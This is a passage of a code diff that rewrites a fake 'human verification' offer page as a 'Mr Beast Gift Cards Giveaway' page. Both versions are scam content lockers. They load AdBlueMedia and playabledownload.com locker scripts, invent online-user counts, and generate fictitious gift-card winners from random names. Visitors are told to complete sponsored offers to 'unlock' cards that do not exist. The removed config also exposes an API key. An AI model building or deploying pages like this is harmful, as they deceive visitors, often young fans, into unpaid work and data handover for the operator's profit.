@@ -1,477 +1,518 @@
-<!doctype html>
-<html lang="hi">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Human Verification -- Demo</title>
-  <meta name="description" content="Human verification page with live AdBlueMedia offers.">
-  <meta name="theme-color" content="#2fe6ff">
-  <style>
-    :root{--aqua:#2fe6ff;--white:#ffffff;--muted-dark:#0b2330;--badge-red:#ff2b2b;--black:#000000;--frame-w:360px}
-    *{box-sizing:border-box;margin:0;padding:0}
-    html,body{height:100%}
-    body{font-family:Inter, system-ui, Arial, sans-serif;background:linear-gradient(135deg,var(--aqua)0%,var(--aqua)40%,var(--white)40%,var(--white)60%,var(--aqua)60%,var(--aqua)100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:18px;color:var(--muted-dark);-webkit-font-smoothing:antialiased}
-    .frame{width:var(--frame-w);max-width:96%;background:rgba(255,255,255,0.03);border-radius:14px;padding:12px 14px 22px;box-shadow:0 10px 30px rgba(3,18,22,0.25);border:1px solid rgba(0,0,0,0.06);position:relative}
-    .top-strip{display:flex;align-items:center;gap:12px;padding:10px;border-radius:10px;background:rgba(255,255,255,0.98);min-height:64px;overflow:hidden}
-    .left-box{display:flex;flex-direction:column;gap:6px;align-items:flex-start;flex:0 0 auto}
-    .live-row{display:flex;align-items:center;gap:8px}
-    .live-label{display:inline-flex;align-items:center;gap:8px;padding:6px 10px;border-radius:10px;background:#fff;border:1px solid rgba(0,0,0,0.04);font-weight:900;color:var(--badge-red)}
-    .live-dot{width:10px;height:10px;border-radius:50%;background:var(--badge-red);box-shadow:0 0 8px rgba(255,43,43,0.25)}
-    .live-dot.blink{animation:blink 1000ms linear infinite}
-    .online-small{font-size:12px;color:#0b2330;font-weight:700}
-    .gift-small{font-size:13px;color:#07323a;background:linear-gradient(#fff,#f7fffe);padding:6px 8px;border-radius:6px;border:1px solid rgba(0,0,0,0.04);font-weight:700;display:inline-flex;align-items:center;gap:8px}
-    .center-wrap{flex:1;min-width:0;display:flex;align-items:center;justify-content:center}
-    .winners-scroller{display:flex;gap:8px;align-items:center;justify-content:flex-start;overflow-x:auto;padding:6px;min-width:0}
-    .chip{display:inline-flex;align-items:center;gap:10px;border-radius:999px;padding:8px;border:1px solid rgba(0,0,0,0.06);background:#fff;min-width:0;max-width:320px;flex:0 0 auto}
-    .chip.expanded{max-width:460px}
-    .avatar{width:36px;height:36px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-weight:800;background:linear-gradient(135deg,#f2f2f2,#e6fbff);color:#0b2330;flex:0 0 36px}
-    .chip-content{display:flex;flex-direction:column;min-width:0}
-    .chip-top{display:flex;gap:8px;align-items:center;min-width:0}
-    .name{font-size:14px;font-weight:800;line-height:1.05;color:#07323a;overflow-wrap:break-word}
-    .flag-badge{display:inline-flex;align-items:center;justify-content:center;font-size:13px;padding:4px 6px;border-radius:8px;background:#f0f7ff;border:1px solid rgba(0,0,0,0.04);flex:0 0 auto}
-    .chip-bottom{display:flex;gap:8px;align-items:center;margin-top:4px}
-    .chip-prize{color:var(--badge-red);font-weight:800}
-    .chip-time{font-size:11px;color:#6b7280}
-    .right-box{flex:0 0 0px}
-    .title{font-size:26px;font-weight:900;color:var(--muted-dark);text-transform:uppercase;letter-spacing:1px;text-align:center;margin-top:8px}
-    .desc{margin:10px 6px 12px;text-align:center;color:var(--muted-dark);font-size:15px}
-    .offers{display:flex;flex-direction:column;gap:14px;margin-top:2px}
-    .offer{background:var(--white);color:var(--muted-dark);border-radius:40px;padding:14px;text-align:center;font-weight:800;font-size:15px;box-shadow:0 10px 24px rgba(2,18,30,0.12);border:1px solid rgba(0,0,0,0.06);cursor:pointer;transition:transform 0.15s, box-shadow 0.15s}
-    .offer:hover{transform:translateY(-2px);box-shadow:0 14px 28px rgba(2,18,30,0.18)}
-    .offer:active{transform:translateY(0)}
-    .offer .offer-desc{font-size:12px;font-weight:500;color:#6b7280;margin-top:4px}
-    .offer .offer-payout{color:var(--badge-red);font-size:13px;font-weight:700;margin-top:3px}
-    .timer-box{display:flex;justify-content:center;margin-top:18px}
-    .timer{background:var(--black);color:#fff;padding:12px 22px;border-radius:10px;font-weight:900;font-size:18px;box-shadow:0 12px 28px rgba(0,0,0,0.45);border:1px solid rgba(255,255,255,0.06)}
-    .loading-text{text-align:center;padding:20px;color:#6b7280;font-size:14px}
-    .lead-status{position:fixed;top:10px;right:10px;background:#fff;padding:10px 14px;border-radius:10px;box-shadow:0 4px 16px rgba(0,0,0,0.15);font-size:13px;font-weight:700;z-index:9999;display:none;max-width:280px}
-    .lead-status.show{display:block}
-    .lead-status.success{color:#16a34a;border-left:4px solid #16a34a}
-    .lead-status.pending{color:#ca8a04;border-left:4px solid #ca8a04}
-    footer{margin-top:16px;text-align:center;color:rgba(11,35,48,0.8);font-size:12px}
-    @media (prefers-reduced-motion: reduce){ .live-dot{animation:none !important} }
-    @keyframes blink{0%{opacity:1}50%{opacity:0.15}100%{opacity:1}}
-    .sr-only{position:absolute !important;height:1px;width:1px;overflow:hidden;clip:rect(1px,1px,1px,1px);white-space:nowrap;border:0;padding:0;margin:-1px}
-    @media(max-width:420px){:root{--frame-w:95%}.frame{width:95%}.chip{max-width:260px}}
-  </style>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mr Beast Gift Cards Giveaway</title>
+    <meta name="description" content="Mr Beast Gift Cards Giveaway"/>
+    <meta property="og:title" content="Mr Beast Gift Cards Giveaway"/>
+    <meta property="og:description" content="Mr Beast Gift Cards Giveaway"/>
+    <meta name="referrer" content="no-referrer">
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Concert+One&display=swap" rel="stylesheet">
+    
+    <!-- AdBlueMedia Locker Script -->
+    <script type="text/javascript">
+        var Tacxl_Iwf_zmOugc={"it":4611554,"key":"fdbb0"};
+    </script>
+    <script src="https://d1g1lhd4vferpn.cloudfront.net/90b513c.js"></script>
+    
+    <style>
+        @font-face{
+            font-family:'Roboto';
+            font-style:normal;
+            font-weight:300;
+            src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Pru33qjShpZSmG3z6VYwnRJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");
+            unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF
+        }
+        @font-face{
+            font-family:'Roboto';
+            font-style:normal;
+            font-weight:300;
+            src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Hgo13k-tfSpn0qi1SFdUfVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");
+            unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000
+        }
+        @font-face{
+            font-family:'Roboto';
+            font-style:normal;
+            font-weight:500;
+            src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/oOeFwZNlrTefzLYmlVV1UBJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");
+            unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF
+        }
+        @font-face{
+            font-family:'Roboto';
+            font-style:normal;
+            font-weight:500;
+            src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/RxZJdnzeo3R5zSexge8UUVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");
+            unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Concert One', cursive;
+        }
+        
+        body {
+            margin: 0;
+            font-family: 'Concert One', cursive;
+            color: #444;
+            place-items: center;
+            scroll-behavior: smooth;
+            background-color: #00acd2;
+            z-index: -1;
+        }
+        
+        .header {
+            font-family: 'Concert One', cursive;
+            font-size: 30px;
+            color: #000;
+            text-align: center;
+            text-transform: uppercase;
+            font-weight: 500;
+        }
+        
+        /* ===== HEADER HIDE WHEN STEP 2 ===== */
+        .header.hidden {
+            display: none;
+        }
+        
+        .icon {
+            width: 200px;
+            font-family: 'Play', sans-serif;
+        }
+        
+        .status-bar {
+            text-align: center;
+            font-family: 'Concert One', cursive;
+            font-size: 18px;
+            color: #fff;
+            padding: 10px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
+        .status-bar span {
+            color: #ffeb3b;
+            font-weight: bold;
+        }
+        
+        .showin {
+            animation: showin 0.5s;
+            animation-fill-mode: forwards;
+        }
+        
+        @keyframes showin {
+            0% { transform: scale(0); }
+            30% { transform: scale(1); }
+            60% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        input {
+            width: 320px;
+            text-align: center;
+            padding: 15px 0px;
+            border-radius: 5px;
+            margin-top: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .appbox1 {
+            max-width: 600px;
+            background: rgba(0, 0, 0, 0.664);
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            margin: auto;
+            border: #333 solid 5px;
+            border-radius: 15px;
+            padding: 10px;
+            z-index: 99;
+        }
+        
+        .appbox {
+            background: rgba(0, 0, 0, 0.507);
+            border: whitesmoke solid 5px;
+            display: flex;
+            flex-wrap: wrap;
+            text-align: center;
+            max-width: 95%;
+            margin: auto;
+            margin-top: 10px;
+            border-radius: 15px;
+            padding: 5px;
+            padding-bottom: 25px;
+            padding-top: 25px;
+            text-decoration: none;
+        }
+        
+        .appbox a {
+            text-decoration: none;
+        }
+        
+        .iconimg {
+            max-width: 130px;
+            cursor: pointer;
+            border-radius: 10px;
+            margin: 10px;
+            box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;
+        }
+        
+        .iconimg:hover {
+            background-color: #333;
+            border: #fff solid 5px;
+            transform: scale(1.1);
+            box-shadow: 0px -25px 20px -20px rgba(255, 255, 255, 0.45), 25px 0 20px -20px rgba(255, 255, 255, 0.45), 0px 25px 20px -20px rgba(255, 255, 255, 0.45), -25px 0 20px -20px rgba(255, 255, 255, 0.45);
+            text-decoration: none;
+        }
+        
+        .selectedcard {
+            background-color: #333;
+            border: #fff solid 5px;
+            transform: scale(1.2);
+            box-shadow: 0px -25px 20px -20px rgba(255, 255, 255, 0.45), 25px 0 20px -20px rgba(255, 255, 255, 0.45), 0px 25px 20px -20px rgba(255, 255, 255, 0.45), -25px 0 20px -20px rgba(255, 255, 255, 0.45);
+        }
+        
+        .button {
+            cursor: pointer;
+            display: block;
+            max-width: 220px;
+            text-align: center;
+            font-size: 20px;
+            border-color: #0069d9;
+            background: #0069d9;
+            color: #fff;
+            border-radius: 10px;
+            padding: 20px;
+            margin: auto;
+            margin-top: 10px;
+            z-index: 99;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .button:hover {
+            border-color: #065cb8;
+            background: #065cb8;
+            transform: scale(1.1);
+        }
+        
+        .showiconimg {
+            max-width: 180px;
+            border-radius: 10px;
+            border: #fff solid 5px;
+            box-shadow: 0px -25px 20px -20px rgba(255, 255, 255, 0.45), 25px 0 20px -20px rgba(255, 255, 255, 0.45), 0px 25px 20px -20px rgba(255, 255, 255, 0.45), -25px 0 20px -20px rgba(255, 255, 255, 0.45);
+        }
+        
+        .text1 {
+            display: block;
+            font-size: 20px;
+            position: relative;
+            z-index: 10000;
+            max-width: 90%;
+            color: #fff;
+            font-family: 'Play', sans-serif;
+            border-radius: 10px;
+            text-align: center;
+            width: 100%;
+            padding: 5px;
+            margin: auto;
+            margin-top: 5px;
+        }
+        
+        #Gentext {
+            font-family: 'Courier New', Courier, monospace;
+            max-width: 350px;
+            margin: auto;
+            border-radius: 10px;
+            background-color: #fff;
+            padding: 10px 20px;
+            color: #000;
+            margin-top: 10px;
+            font-size: 1.2rem;
+            letter-spacing: 3px;
+            font-weight: bold;
+        }
+        
+        #Gentext1 {
+            color: #fff;
+        }
+        
+        .Gen-Text {
+            font-family: 'Play', sans-serif;
+            font-size: 20px;
+            margin: 20px;
+        }
+        
+        #google_translate_element {
+            padding: 10px;
+        }
+        
+        svg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            z-index: -1;
+        }
+        
+        /* ===== MOBILE 2 COLUMNS - SMALLER CARDS ===== */
+        @media (max-width: 768px) {
+            .status-bar {
+                font-size: 14px;
+                white-space: nowrap;
+                overflow: hidden;
+                text-overflow: ellipsis;
+                padding: 8px 5px;
+            }
+            
+            .appbox {
+                display: grid;
+                grid-template-columns: repeat(2, 1fr);
+                gap: 6px;
+                padding: 8px;
+            }
+            
+            .iconimg {
+                max-width: 100%;
+                width: 100%;
+                margin: 0;
+                border-radius: 6px;
+            }
+        }
+        
+        /* ===== EXTRA SMALL MOBILE ===== */
+        @media (max-width: 480px) {
+            .appbox {
+                gap: 4px;
+                padding: 6px;
+            }
+            
+            .iconimg {
+                border-radius: 4px;
+            }
+        }
+        
+        /* ===== VERY SMALL MOBILE - TINY CARDS ===== */
+        @media (max-width: 360px) {
+            .appbox {
+                gap: 3px;
+                padding: 4px;
+            }
+            
+            .iconimg {
+                border-radius: 3px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="frame" role="main">
-    <div class="top-strip" aria-live="polite">
-      <div class="left-box">
-        <div class="live-row">
-          <div class="live-label" aria-hidden="false">
-            <span id="liveDot" class="live-dot blink" aria-hidden="true"></span>
-            <span class="live-text">LIVE</span>
-          </div>
-          <div id="onlineSmall" class="online-small" aria-hidden="false">... online</div>
+
+    <center>
+        <div id="google_translate_element"></div>
+    </center>
+
+    <svg preserveAspectRatio="xMidYMid slice" viewBox="10 10 80 80">
+        <defs>
+            <style>
+                @keyframes rotate {
+                    0% { transform: rotate(0deg); }
+                    100% { transform: rotate(360deg); }
+                }
+                .out-top {
+                    animation: rotate 20s linear infinite;
+                    transform-origin: 13px 25px;
+                }
+                .in-top {
+                    animation: rotate 10s linear infinite;
+                    transform-origin: 13px 25px;
+                }
+                .out-bottom {
+                    animation: rotate 25s linear infinite;
+                    transform-origin: 84px 93px;
+                }
+                .in-bottom {
+                    animation: rotate 15s linear infinite;
+                    transform-origin: 84px 93px;
+                }
+            </style>
+        </defs>
+        <path fill="#9b5de5" class="out-top" d="M37-5C25.1-14.7,5.7-19.1-9.2-10-28.5,1.8-32.7,31.1-19.8,49c15.5,21.5,52.6,22,67.2,2.3C59.4,35,53.7,8.5,37-5Z" />
+        <path fill="#f15bb5" class="in-top" d="M20.6,4.1C11.6,1.5-1.9,2.5-8,11.2-16.3,23.1-8.2,45.6,7.4,50S42.1,38.9,41,24.5C40.2,14.1,29.4,6.6,20.6,4.1Z" />
+        <path fill="#00bbf9" class="out-bottom" d="M105.9,48.6c-12.4-8.2-29.3-4.8-39.4.8-23.4,12.8-37.7,51.9-19.1,74.1s63.9,15.3,76-5.6c7.6-13.3,1.8-31.1-2.3-43.8C117.6,63.3,114.7,54.3,105.9,48.6Z" />
+        <path fill="#00f5d4" class="in-bottom" d="M102,67.1c-9.6-6.1-22-3.1-29.5,2-15.4,10.7-19.6,37.5-7.6,47.8s35.9,3.9,44.5-12.5C115.5,92.6,113.9,74.6,102,67.1Z" />
+    </svg>
+
+    <div id="header" class="header">
+        <img src="https://d266key948fg17.cloudfront.net/uploads/1678361332af23ddeeafd54eb78d7951d71bb13a42.png" class="icon">
+        <br>
+        <img src="https://d266key948fg17.cloudfront.net/uploads/16884397763708be1ecd6cf1de3893bcbaf16c9219.png" style="width: 25px;">
+        <br>GIFT CARD GIVEAWAY
+    </div>
+
+    <!-- User Online Status Bar -->
+    <div class="status-bar">
+        User Online: <span id="user-online">294</span> | Last update: <span id="update-date">Jun 07 2026</span>
+    </div>
+
+    <div id="download" style="display: none; margin-top: 20px;" class="appbox1">
+        <div><img src=" " id="imggen" class="showiconimg"></div>
+        <div style="display: none;" class="Gen-Text" id="Gentext"></div>
+        <div style="display: none;" class="Gen-Text" id="Gentext1">Complete a sponsored activity to unlock the final code. This will help pay for your card.</div>
+
+        <!-- Verify Button -->
+        <div style="display: none;" class="button" id="button1" onclick="handleVerifyClick()">
+            Verify
         </div>
-        <div id="giftSmall" class="gift-small">
-          <span id="giftLiveText">Loading...</span>
+
+        <!-- STEP 1: Get Now button shows first -->
+        <div id="step1">
+            <div class="text1">Here is your gift card!</div>
+            <div class="button" id="button" onclick="showGenStep()"> Get Now! </div>
         </div>
-      </div>
-      <div class="center-wrap">
-        <div class="winners-scroller" id="winners" role="list" aria-label="Recent winners">
-          <!-- chips injected here -->
-        </div>
-      </div>
-      <div class="right-box" aria-hidden="true"></div>
     </div>
 
-    <div class="banner" id="headerBanner">
-      <div id="pageTitle" class="title">HUMAN VERIFICATION</div>
+    <div class="appbox" id="appbox">
+        <a href="#header">
+            <img onclick="card(1)" src="https://d266key948fg17.cloudfront.net/uploads/168351558560a555c5564b1d3786b74d9ef861a760.png" class="iconimg" id="card1">
+            <img onclick="card(2)" src="https://d266key948fg17.cloudfront.net/uploads/16835155878748b3ee2e78d26f67f8a25ffdccbacc.png" class="iconimg" id="card2">
+            <img onclick="card(3)" src="https://d266key948fg17.cloudfront.net/uploads/16888819910ba9f8c460a03d8dc543a8e9c788b311.png" class="iconimg" id="card3">
+            <img onclick="card(4)" src="https://d266key948fg17.cloudfront.net/uploads/16835162124327c5dd85b75f93ac5b40d83f7a0fc7.png" class="iconimg" id="card4">
+            <img onclick="card(5)" src="https://d266key948fg17.cloudfront.net/uploads/168351558813755e89e3f453a0ddc7fe24df7c8ff3.png" class="iconimg" id="card5">
+            <img onclick="card(6)" src="https://d266key948fg17.cloudfront.net/uploads/1683515587d7137bdf5e6ef50a1b25500a4729490f.png" class="iconimg" id="card6">
+            <img onclick="card(7)" src="https://d266key948fg17.cloudfront.net/uploads/1683515586bb993477f94e1a2cb20d215d6bc40809.png" class="iconimg" id="card7">
+            <img onclick="card(8)" src="https://d266key948fg17.cloudfront.net/uploads/168351558787a27e0fb81f743e6ed8a241ee9b27e4.png" class="iconimg" id="card8">
+            <img onclick="card(9)" src="https://d266key948fg17.cloudfront.net/uploads/1683515586181c716e649e0de5204b5d7537669473.png" class="iconimg" id="card9">
+            <img onclick="card(10)" src="https://d266key948fg17.cloudfront.net/uploads/16835155892ec64137df5b248ab76c47e25694999a.png" class="iconimg" id="card10">
+            <img onclick="card(11)" src="https://d266key948fg17.cloudfront.net/uploads/16835155851a4468a359a9cb675ea185fcf71ab6d8.png" class="iconimg" id="card11">
+            <img onclick="card(12)" src="https://d266key948fg17.cloudfront.net/uploads/16835155847d885a68fbf01c3c98d346efa14d0a3c.png" class="iconimg" id="card12">
+            <img onclick="card(13)" src="https://d266key948fg17.cloudfront.net/uploads/1683515584aa0d151a43729454454784dfd0e78ed8.png" class="iconimg" id="card13">
+            <img onclick="card(14)" src="https://d266key948fg17.cloudfront.net/uploads/1683515584d23f7cda78a87917d071cfdcd80cd2a6.png" class="iconimg" id="card14">
+            <img onclick="card(15)" src="https://d266key948fg17.cloudfront.net/uploads/1683515583c80a90818f98dd5b530d7658c670b29f.png" class="iconimg" id="card15">
+            <img onclick="card(16)" src="https://d266key948fg17.cloudfront.net/uploads/168351558269416cf617bfe6668e55ad8db023750d.png" class="iconimg" id="card16">
+            <img onclick="card(17)" src="https://d266key948fg17.cloudfront.net/uploads/16835155821ce0b5e8da2485a766e01438af4c98cf.png" class="iconimg" id="card17">
+            <img onclick="card(18)" src="https://d266key948fg17.cloudfront.net/uploads/1683515582188f681dceb4d54bb0ca2a44ecc5ae2e.png" class="iconimg" id="card18">
+            <img onclick="card(19)" src="https://d266key948fg17.cloudfront.net/uploads/1683515580ffc9bf439ab9a1b6927ce97463eb2883.png" class="iconimg" id="card19">
+            <img onclick="card(20)" src="https://d266key948fg17.cloudfront.net/uploads/1683515581c543e9517e74262f450f0d5c3c8a40d2.png" class="iconimg" id="card20">
+            <img onclick="card(21)" src="https://d266key948fg17.cloudfront.net/uploads/1683515581a1481b807a7aeaa03ec0d01cee167cc2.png" class="iconimg" id="card21">
+            <img onclick="card(22)" src="https://d266key948fg17.cloudfront.net/uploads/1683515579c0063555d35f573fa6a19c893cd3b1fc.png" class="iconimg" id="card22">
+            <img onclick="card(23)" src="https://d266key948fg17.cloudfront.net/uploads/168351558018d0f22b2a201cafa7446c84ebca10bd.png" class="iconimg" id="card23">
+            <img onclick="card(24)" src="https://d266key948fg17.cloudfront.net/uploads/16835155804025a27ee677a002e9b9a9d00e60c803.png" class="iconimg" id="card24">
+            <img onclick="card(25)" src="https://d266key948fg17.cloudfront.net/uploads/1683515579e9cef2557aa62295863fe0cc259ec90a.png" class="iconimg" id="card25">
+            <img onclick="card(26)" src="https://d266key948fg17.cloudfront.net/uploads/1683515579b8f11cac60402fdfe438578c3bdc9519.png" class="iconimg" id="card26">
+            <img onclick="card(27)" src="https://d266key948fg17.cloudfront.net/uploads/16835155786f1b9ae97f0444022e99030b7660bb7d.png" class="iconimg" id="card27">
+            <img onclick="card(28)" src="https://d266key948fg17.cloudfront.net/uploads/1683515577114fea203a24b08e7d746276dad9e428.png" class="iconimg" id="card28">
+            <img onclick="card(29)" src="https://d266key948fg17.cloudfront.net/uploads/1683515578dc7bf3e6a1b096eb8992eaadef8c37fa.png" class="iconimg" id="card29">
+            <img onclick="card(30)" src="https://d266key948fg17.cloudfront.net/uploads/1683515577b67819cadd48b1796be797f19412a050.png" class="iconimg" id="card30">
+            <img onclick="card(31)" src="https://d266key948fg17.cloudfront.net/uploads/16835155776888048542b1aee83f60cada03b5e9fe.png" class="iconimg" id="card31">
+            <img onclick="card(32)" src="https://d266key948fg17.cloudfront.net/uploads/16835155766b7de6286253f9137b8a8017235f8ff9.png" class="iconimg" id="card32">
+            <img onclick="card(33)" src="https://d266key948fg17.cloudfront.net/uploads/16835155751ab0f5a98bc7d5e1e6deb62a607666ac.png" class="iconimg" id="card33">
+            <img onclick="card(34)" src="https://d266key948fg17.cloudfront.net/uploads/1683515576889384a64b3805cd83a49235578d0c84.png" class="iconimg" id="card34">
+            <img onclick="card(35)" src="https://d266key948fg17.cloudfront.net/uploads/1683515575f94e95b5fa567adfe83d22866a026691.png" class="iconimg" id="card35">
+            <img onclick="card(36)" src="https://d266key948fg17.cloudfront.net/uploads/16835155759bb03a1c8cd60dd03ce3c7cdfc3d5729.png" class="iconimg" id="card36">
+            <img onclick="card(37)" src="https://d266key948fg17.cloudfront.net/uploads/168351557414a549caf2272daa52328b3e9a887196.png" class="iconimg" id="card37">
+            <img onclick="card(38)" src="https://d266key948fg17.cloudfront.net/uploads/1683515574519de4f41af72361cdc267ddb04ea418.png" class="iconimg" id="card38">
+            <img onclick="card(39)" src="https://d266key948fg17.cloudfront.net/uploads/168351557317debab7cd0529195a1bd0f29aa07902.png" class="iconimg" id="card39">
+            <img onclick="card(40)" src="https://d266key948fg17.cloudfront.net/uploads/168351557339e3880a6a59b3ce405f9a101166b46a.png" class="iconimg" id="card40">
+            <img onclick="card(41)" src="https://d266key948fg17.cloudfront.net/uploads/1688881990e56e48dac9cfc02dcccbebcae8315b37.png" class="iconimg" id="card41">
+            <img onclick="card(42)" src="https://d266key948fg17.cloudfront.net/uploads/1688881988cd9bbe2303211f05f847dd99f8d9ffb9.png" class="iconimg" id="card42">
+            <img onclick="card(43)" src="https://d266key948fg17.cloudfront.net/uploads/1688881988d472c750c492bb306446f181d96b785d.png" class="iconimg" id="card43">
+            <img onclick="card(44)" src="https://d266key948fg17.cloudfront.net/uploads/1683515588d9add22281c8e75444fe5ae9fa465d51.png" class="iconimg" id="card44">
+        </a>
     </div>
 
-    <div class="desc">Complete <strong>'Any One'</strong> of the offers below to prove that you are not a BOT.</div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript" src="https://playabledownload.com/script_include.php?id=1600536"></script>
 
-    <!-- AdBlueMedia API Offers Container -->
-    <div class="offers" id="offers" role="list">
-      <div class="loading-text" id="offersLoading">Loading offers...</div>
-    </div>
-
-    <div class="timer-box">
-      <div class="timer" id="timer" role="status" aria-live="polite">05:00</div>
-    </div>
-
-    <footer>Powered by AdBlueMedia API</footer>
-  </div>
-
-  <!-- Lead Status Notification -->
-  <div id="leadStatus" class="lead-status">
-    <div id="leadStatusText">Checking leads...</div>
-  </div>
-
-  <noscript>
-    <div style="position:fixed;left:0;right:0;bottom:0;background:#fff;padding:10px;text-align:center;border-top:1px solid #eee;">JavaScript disabled -- page ka kuch hissa sahi se kaam nahi karega.</div>
-  </noscript>
-
-  <div id="srAnnounce" class="sr-only" aria-live="polite"></div>
-
-  <script>
-  'use strict';
-  (function(){
-    // ==================== CONFIG ====================
-    const ADBLUEMEDIA_CONFIG = {
-      user_id: '790910',
-      api_key: '6b39c9c694191d9cbc9153509bce006b',
-      feed_url: 'https://de6jvomfbm0af.cloudfront.net/public/offers/feed.php',
-      check_url: 'https://de6jvomfbm0af.cloudfront.net/public/external/check2.php',
-      num_offers: 10, // Max 10
-      s1: '',
-      s2: ''
-    };
-
-    // ==================== GIFT / WINNERS LOGIC ====================
-    const giftTypes = ['Amazon','Google Play','Steam','Xbox','Roblox','Spotify','iTunes','Fortnite'];
-    const amounts = [50,75,100,150,200];
-    const firstNames = [
-      'Liam','Olivia','Noah','Emma','Oliver','Ava','William','Sophia','James','Isabella',
-      'Benjamin','Mia','Lucas','Charlotte','Henry','Amelia','Santiago','Sofía','Mateo','Valentina',
-      'Diego','Camila','Sebastián','Lucía','Aisha','Kwame','Fatima','Chinonso','Nia','Abdul','Zuri','Kofi',
-      'Omar','Lina','Hanan','Youssef','Leila','Hassan','Mariam','Ali','Hiro','Yuna','Min','Soo','Wei','Yuki','Jin','Sora',
-      'Kai','Zoe','Ethan','Aarav','Isha','Zara','Rohan','Ananya','Ishaan','Alex','Taylor','Jordan','Casey','Riley','Quinn','Morgan','Rowan'
-    ];
-    const lastSurnames = ['Smith','Garcia','Ng','Chen','Khan','Silva','Rossi','Martin','Kim','Ivanov','Brown','Lopez','Dubois','Park','Johnson','Müller','Singh','Alvarez','Okafor','Hernández','Nakamura','Owen','Diaz','Costa','Petrov'];
-    const lastInitials = ['S.','G.','L.','C.','K.','P.','R.','M.','N.','I.','B.','D.','T.','O.','V.','H.','Y.','Z.'];
-    const flags = ['🇺🇸','🇬🇧','🇨🇦','🇦🇺','🇮🇳','🇮🇹','🇪🇸','🇫🇷','🇩🇪','🇧🇷','🇦🇪','🇿🇦','🇸🇬','🇯🇵','🇰🇷','🇲🇽','🇳🇱','🇵🇭','🇹🇷','🇮🇱'];
-
-    const winnersEl = document.getElementById('winners');
-    const onlineSmall = document.getElementById('onlineSmall');
-    const giftLiveText = document.getElementById('giftLiveText');
-    const liveDot = document.getElementById('liveDot');
-    const srAnn = document.getElementById('srAnnounce');
-
-    const recent = [];
-    const MAX_CHIPS = 6;
-    const NO_REPEAT_WINDOW = 25;
-
-    function rndInt(max){ return Math.floor(Math.random()*max); }
-    function rnd(arr){ return arr[rndInt(arr.length)]; }
-    function initials(name){ return name.split(' ').slice(0,2).map(s=>s.charAt(0).toUpperCase()).join(''); }
-
-    function pickGift(){
-      const type = rnd(giftTypes);
-      const amt = rnd(amounts);
-      return `$${amt} ${type}`;
-    }
-
-    function generateUniqueName(){
-      const avoid = new Set(recent.slice(0,NO_REPEAT_WINDOW).map(r=>r.name));
-      for(let attempt=0; attempt<20; attempt++){
-        const first = rnd(firstNames);
-        if(Math.random() < 0.55){
-          const last = rnd(lastSurnames);
-          const candidate = `${first} ${last}`;
-          if(!avoid.has(candidate)) return candidate;
-        } else {
-          const lastI = rnd(lastInitials);
-          const candidate = `${first} ${lastI}`;
-          if(!avoid.has(candidate)) return candidate;
+    <script>
+        // Auto update date
+        function updateDate() {
+            var now = new Date();
+            var months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
+            var day = now.getDate();
+            var month = months[now.getMonth()];
+            var year = now.getFullYear();
+            document.getElementById("update-date").innerHTML = month + " " + (day < 10 ? "0" + day : day) + " " + year;
         }
-      }
-      const fallbackFirst = rnd(firstNames);
-      const fallbackLast = rnd(lastSurnames);
-      const suffix = Math.floor(100 + Math.random()*900);
-      return `${fallbackFirst} ${fallbackLast}${suffix}`;
-    }
+        updateDate();
 
-    function makeWinner(){
-      const name = generateUniqueName();
-      const prize = pickGift();
-      const flag = rnd(flags);
-      return { name, prize, flag, time: new Date() };
-    }
-
-    function formatTime(d){
-      const h = d.getHours(), m = d.getMinutes();
-      return (h<10?'0':'')+h+':'+(m<10?'0':'')+m;
-    }
-
-    function render(){
-      winnersEl.innerHTML = '';
-      recent.slice(0,MAX_CHIPS).forEach(w => {
-        const chip = document.createElement('div'); chip.className='chip'; chip.setAttribute('role','listitem');
-        chip.title = `${w.name} -- ${w.prize} ${w.flag} (${formatTime(w.time)})`;
-
-        const av = document.createElement('div'); av.className='avatar'; av.textContent = initials(w.name);
-
-        const content = document.createElement('div'); content.className='chip-content';
-        const top = document.createElement('div'); top.className='chip-top';
